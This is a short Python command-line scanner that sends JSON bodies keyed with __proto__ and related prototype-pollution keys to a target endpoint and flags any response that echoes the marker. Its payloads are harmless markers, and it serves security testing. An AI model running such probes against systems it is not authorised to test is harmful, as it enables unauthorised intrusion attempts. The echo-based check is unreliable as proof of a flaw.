import requests
import sys
import json
from termcolor import colored

POLLUTION_KEYS = [
    "__proto__",
    "constructor.prototype",
    "prototype.__proto__"
]

PAYLOAD = {
    "polluted": True
}

def test_endpoint(url):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0"
    }

    print(colored(f"[🔬] Testing: {url}", "yellow"))
    for key in POLLUTION_KEYS:
        polluted_json = json.dumps({key: PAYLOAD})
        try:
            res = requests.post(url, headers=headers, data=polluted_json, timeout=10)
            if res.status_code < 500 and "polluted" in res.text.lower():
                print(colored(f"[💥] Prototype Pollution Possible via key: {key}", "red"))
            else:
                print(colored(f"[⚙️] Tried key '{key}' — No obvious effect.", "cyan"))
        except Exception as e:
            print(colored(f"[❌] Error during request: {e}", "red"))

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 prototype_pollution_detector.py https://target.com/api/endpoint")
        sys.exit(1)

    test_endpoint(sys.argv[1])
